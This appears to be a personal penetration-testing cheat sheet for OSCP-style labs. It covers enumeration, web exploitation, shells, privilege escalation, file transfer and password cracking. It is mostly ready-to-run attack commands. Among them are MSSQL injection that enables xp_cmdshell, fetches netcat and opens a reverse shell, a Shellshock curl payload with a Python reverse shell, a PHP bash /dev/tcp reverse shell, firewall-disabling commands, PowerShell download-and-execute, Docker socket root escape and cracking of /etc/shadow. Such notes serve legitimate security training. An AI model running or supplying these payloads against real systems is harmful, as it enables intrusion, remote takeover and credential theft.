# Recon

Tips
* Use BOTH `searchsploit` and `google` to find vulnerable service versions. Sometimes searchsploit may not have updated results.

Network - Nmap
```
$ sudo nmap -v -A [target]  # TCP default ports, OS detection, version detection, script scanning, and traceroute.
$ sudo nmap -v -p- [target] # TCP all ports.
$ sudo nmap -v -sU [target] # UDP default ports.

# Aggressive scans
$ sudo nmap -sUV -T4 -F --version-intensity 0 [target]  # UDP aggresive
$ sudo nmap -v -p- -T4 [target]                         # TCP all-ports aggressive

# OR alternative fast scans w/ NmapAutomator
$ nmapAutomator.sh [target] Full
```

Web - Gobuster
```
$ gobuster dir -u [target] -w ~/OSCP/SecLists/Discovery/Web-Content/[wordlist]
$ nikto -host [target]
```


### FTP [21 TCP]

Anonymous login
```
$ ftp [target]
Name: anonymous
Password
```

### SMTP [25 TCP]

Manual fingerprinting
```
$ echo VRFY 'admin' | nc -nv -w 1 [target] 25
```

SMTP user enumeration
```
$ smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t [target]
```

### TFTP [69 UDP]

TFTP is a simple protocol for transferring files.

Pentest UDP TFTP: https://book.hacktricks.xyz/pentesting/69-udp-tftp

TFTP Nmap enum
```
$ nmap -sU -p69 --script tftp-enum [target]
```

TFTP commands
```
$ tftp
tftp> connect [target]
tftp> put [/path/to/local.txt]
tftp> get [/path/to/remote.txt]

# directory traversal
tftp> get ..\..\..\..\..\boot.ini
tftp> get \boot.ini
```


### Web [80, 8080, 443 TCP]

Tips
* ALWAYS run Nikto.
* ALWAYS run Gobuster.
* If you can't find anything from initial scans, recursively scan subdirs including those that you don't think contain anything e.g. `/icons`
* Append CLRF `%0d%0a` to payloads or file-extensions.

Arbitrary file disclosure / LFI / RFI
* Try all three if one works.

SQL Injection
1. Test single and double quotes for *500 Internal Server Error* response.
2. Manually test payloads or use Burp Intruder with SQL payloads.
3. Grab password hashes or perform code exec to obtain reverse shell.

MSSQL Injection
```
/login.asp?name=admin'%20or%20'1'%3d'1'--&pass=asdf # bypass login

';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; # enable xp_cmdshell code exec
';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;           # enable xp_cmdshell code exec
';EXEC%20xp_cmdshell%20'ping%20192.168.119.210'--            # test code exec

';EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://[kali]/nc.exe'-- # upload netcat
';EXEC xp_cmdshell 'nc 192.168.119.210 443 -e cmd.exe'--    # initiate reverse shell connection
```

Apache Shellchock (/cgi-bin/*.cgi])
```
# Test if vulnerable
curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'VULNERABLE'" http://[target]/cgi-bin/[cgi_file]

# Reverse shell
curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
```

Apache Tomcat
* Default creds at `SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt`
* Port 8009 (AJP) open: CVE-2020-1938 "GhostCat" LFI vulnerability (restricted to paths in Tomcat root).

IIS
* IIS paths may be configured to be Case Sensitive. Take care when navigating / exploiting LFI/RFI or directory traversal.

### POP3 [110 TCP]

Post Office Protocol (ver 3) is an application layer protocol used to download emails from a remote server to your local device.

Useful commands
```
$ telnet [target] 110
> USER [username]
+ OK
> PASS [pass]
+ OK
> LIST               # list all messages
> RETR [message no.] # retrieve email
```

### RPC/Portmapper [111, 135 TCP]

General enum
```
$ rpcinfo -p [target]
$ nmblookup -A [target]
$ smbclient -L //[target]   // null session
$ rpcclient -U "" [target]  // null session
$ enum4linux [target]       // null session
$ nbtscan [target]
```

RPC client
```
$ rpcclient -U "" -N [target]
rpcclient> srvinfo
rpcclient> enumdomains
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> getdompwinfo

# Follow up enum
rpcclient> querygroup 0x200
rpcclient> querygroupmem 0x200
rpcclient> queryuser 0x3601
rpcclient> getusrdompwinfo 0x3601
```

### IMAP

Pentesting IMAP: https://book.hacktricks.xyz/pentesting/pentesting-imap

### Samba (LINUX SMB) [139 TCP]

Check Samba service version.
* Samba <2.2.8 versions are vulnerable to RCE.
* Samba 3.5.11/3.6.3 versions are vulnerable to RCE.


### SMB (WINDOWS SMB) [139, 445 TCP]

Automated enum
```
$ python3 ~/OSCP/Tools/enum4linux-ng/enum4linux-ng.py [target] 
```

Eternal Blue check
```
$ sudo nmap --script smb-vuln-* [target]
```

Enumerate SMB
```
$ smbclient --no-pass -L //10.11.1.31         # list shares
$ smbclient --no-pass \\\\[target]\\[share]   # connect to a share

$ smbmap -u "guest" -R [share] -H 10.11.1.31  # recursively list files in a folder
$ smbget -R smb://[target]/share                # recursively get files from target share/dir
```

### SNMP [161 UDP]

SNMP is an app-layer protocol for collecting and managing information about devices within a network.

SNMP enumeration:
(find further info about devices/software with vulns to gain a shell)
```
$ snmpwalk -c [community string] -v1 [ target ]
$ onesixtyone [ target ] -c community.txt
$ snmpenum
$ snmp-check [ target ]
```

Snmpwalk brute-force script:
* [Community string wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt)
```
#!/bin/bash
while read line; do
    echo "Testing $line"; snmpwalk -c $line -v1 10.10.10.105
done < community.txt
```


### LDAP [389,636 TCP]

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Enumerate LDAP
```
$ nmap -p389 -n -sV --script "ldap* and not brute" [target]
$ ldapsearch -x -b "dc=acme,dc=com" "*" -h [target]
```


### MS SQL [1433 TCP]
```
# Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
$ sqsh -S <IP> -U <Username> -P <Password> -D <Database>
```

### MuSQL [3306 TCP]

[MySQL commands cheatsheet](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)

Ways to perform MySQL privesc (maybe move to privesc section).

### Apache James Mail Server [4555 TCP]

Default credentials are `root` / `root`.

`Version 2.3.2` is vulnerable to [RCE - SEE HERE](https://packetstormsecurity.com/files/164313/Apache-James-Server-2.3.2-Remote-Command-Execution.html).

### VNC [5800, 5900 TCP]

Connect to VNC
```
$ vncviewer [target]::[port]
```

VNC login brute-force
```
$ hydra -s 5900 -P /usr/share/wordlists/rockyou.txt [target] vnc
```

VNC authentication bypass:
```
# First, check if VNC service is vulnerable to auth bypass:
https://github.com/curesec/tools/blob/master/vnc/vnc-authentication-bypass.py
# If vulnerable, run manual exploit:
https://github.com/arm13/exploits-1/blob/master/vncpwn.py
# If that doesn't work, try MSF module:
msf> use auxiliary/admin/vnc/realvnc_41_bypass
```

VNC password cracking:
https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/

## Shells

Tricks
* Try to URL encode payload if exploit is not working in webapp.
* Try to remove firewall rules if rshell payloads don't trigger (see below). Confirm code exec by creating `test.txt` file on target if you have a way to identify that the file was created e.g. via. `smb` or `ftp` etc.


Bypassing Linux firewalls
```
# flush Iptables - delete all rules temporarily.
# add this command before executing reverse shell connection/command.
$ iptables --flush
```

Bypassing Windows firewalls
```
# Win Vista, 7, 8, Server 2008, 10
cmd> netsh advfirewall set allprofiles state off
cmd> netsh advfirewall set currentprofile state off

# Older Win, XP, Server 2003
cmd> netsh firewall set opmode mode=DISABLE
```

Spawn TTY shell / rbash restricted shell escape
```
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
:!bash                       # within vi
:set shell=/bin/bash:shell   # within vi
!sh                          # within nmap)

# REMEMBER TO DO THIS
$ export PATH=$PATH:/usr/bin:/bin:[other paths]
```

Web shell + SMB exec
```
# Setup local share e.g. python3 ../smbserver.py EVILSHARE .
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share] 

# Execute netcat reverse shell within webshell
> \\[host]\share\nc.exe [host] [port] -e cmd.exe
```

Have a web shell? Check if server can reach you
```
$ sudo tcpdump -i tun0 -n icmp -v
```

CGI / Perl Web Server
* If web server is running CGI scripts, try Perl rshell payload -> change extension to `.cgi`.

Powershell
```
# Exec local PS script
cmd> powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"

# Exec remote PS script
PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
```

Powershell locations on 64bit Windows
```
# 32bit powershell
c:\windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

# 64bit powershell
c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe
```

Bypass PHP disable functions
```
<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.5/4444 0>&1'"); ?>
```

## Linux Privilege Escalation

Tips:
* PE could rely on the same vulnerability to obtain an initial foothold.

### Automated recon

Linpeas.sh
Linenum.sh

### SUID / SGID

[SUID3ENUM.py](https://github.com/Anon-Exploiter/SUID3NUM)
* Find SUID binaries -> cross-match with GTFO bins.
* Don't use `-e` flag for auto-exploitation (OSCP banned).
```
$ python suid3num.py
```

### Running services

Tips:
* Check firewall rules.
* Check for anti-virus software and see if you need to disable.

Method 1:
* Check if services running as root are writable by user.
* Overwrite binary or reference file/arg with your own payload for privesc.

Method 2:
* Check version of services running as root.
* See if vulnerable to a local privilege escalation vuln.

### Binary service versions

GTFOBins
* GTFOBins are a list of Unix binaries that can be used for privesc in misconfigured systems.
* Check your binaries against [GTFOBins list](https://gtfobins.github.io/).

Vulnerable binary versions
1. Look for binaries, especially non-standard ones.
2. Run `$ searchsploit [binary_name] [version]` and exploit.

### Docker privesc

Basic privesc example: https://flast101.github.io/docker-privesc/
More on Docker breakout & privesc: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout

Writable Docker Socket */var/run/docker.sock*: [see here](https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket)
* Detected Linpeas.sh or manually.
* Requires image -> if none, run `docker pull` to download an image to machine.
```
# CHECK IF WRITABLE
$ ls -la /var/run/docker.sock

# OPTION 1
$ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash

# OPTION 2
$ docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```


## Windows Privilege Escalation

### Tips

Ensure architecture of your PS shell = architecture of PS payload.
* Check if PS shell is 64bit `[Environment]::Is64BitProcess`


### Automated Scripts

```
cmd> jaw
```

### OS Vulnerabilities

Windows Exploit Suggester
```
$ python3 windows_exploit_suggester.py --update
$ python3 windows_exploit_suggester.py --database 2021-10-27-mssb.xls --systeminfo systeminfo.out
```

Sherlock.ps1
1. Copy local `sherlock.ps1` file to remote.
2. Run `cmd> powershell -executionpolicy bypass ".\sherlock.ps1"`.


### Insecure Service Permissions

STEP 1: Check service permissions
* Icacls output reference: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753525(v=ws.10)?redirectedfrom=MSDN
```
# windows/winXP
cmd> icacls/cacls [fullpath/to/service]

# powershell
PS> Get-Acl
PS> Get-ChildItem | Get-Acl
```

STEP 2: Replace service binary with malicious binary and restart service.
```
cmd> sc qc [servicename] restart
```



### File & Folder Permissions

### Access Token Abuse

Walkthrough: https://www.notion.so/CHEATSHEET-ef447ed5ffb746248fec7528627c0405#5cedd479d1c1429e8018211371eec1ad

Windows CLSIDs: http://ohpe.it/juicy-potato/CLSID/


JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled
```
# Edit nc.bat with correct params and transfer to remote host
cmd> whoami /privs
cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
```

### Firewall Config / Disable

Netsh
```
cmd> netsh [advfirewall] firewall show state name=all

TODO: ADD DISABLE COMMANDS
```


## File Transfer Methods

### Linux
```
```

### Windows

Powershell
```
# Download file from remote to local
cmd> Powershell -c (New-Object Net.WebClient).DownloadFile('http://[host]:[port]/[file]', '[file]')

# Execute remote PS script
PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
```

Certutil
```
cmd> certutil.exe -urlcache -split -f http://[kali]/[src_file]
```

Bitsadmin
```
cmd> bitsadmin /transfer badthings http://[kali]:[port]/[src_file] [dest_file]
```

Wget -> cscript
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# After you've created wget.vbs
cmd> cscript wget.vbs http://[host]/evil.exe evil.exe
```

SMB
```
# Kali - host SMB share
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share]  # setup local share

# Target - connect to share
cmd> net view \\[kali]              # view remote shares
cmd> net use \\[kali]\[share]       # connect to share
cmd> copy \\[kali]\[share]\[src_file] [/path/to/dest_file]  # copy file
```

## Compilation

Linux C to .SO (shared library)
```
$ gcc -o exploit.so -shared exploit.c -fPIC 
```

Linux 32/64bit cross-architecture ELF
```
$ gcc -m32 -Wl,--hash-style=both exploit.c -o exploit
```

Linux to Windows EXE
```
$ i686-w64-mingw32-gcc 25912.c -o exploit.exe -lws2_32
$ wine exploit.exe
```

Windows Python to Windows EXE
```
$ python pyinstaller.py --onefile <pythonscript>
```

## Password Cracking

Online hash cracker: https://crackstation.net/

Cracking linux hashes - requires `/etc/passwd` and `/etc/shadow`
```
$ unshadow passwd.txt shadow.txt > passwords.txt
$ john --wordlist=rockyou.txt passwords.txt
```

